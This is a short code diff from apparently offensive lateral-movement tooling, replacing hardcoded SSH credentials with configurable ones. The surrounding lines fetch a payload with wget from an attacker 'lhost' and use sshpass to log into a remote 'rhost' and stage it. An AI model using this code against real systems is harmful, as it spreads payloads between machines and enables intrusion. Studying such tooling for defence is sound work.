@@ -1251,8 +1251,11 @@ class LateralMigratedCommandSet(PendingCommandSet):
             command = f"cd {sessions} && wget -O {name} --header='Accept: application/gzip' {self.url_download}"
             self.cmd(command)
         command_remote = f"wget -O {name} http://{self.params['lhost']}/{name}"
-        username = "grisun0"
-        password = "grisgrisgris"
+        username = self.params.get("start_user", "CHANGE_ME")
+        password = self.params.get("start_pass", "CHANGE_ME")
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("start_user and start_pass must be configured in payload.json")
+            return
         ssh = f"""sshpass -p '{password}' ssh {username}@{self.params['rhost']} '
         mkdir -p {tmp} ;
         cd {tmp} ;
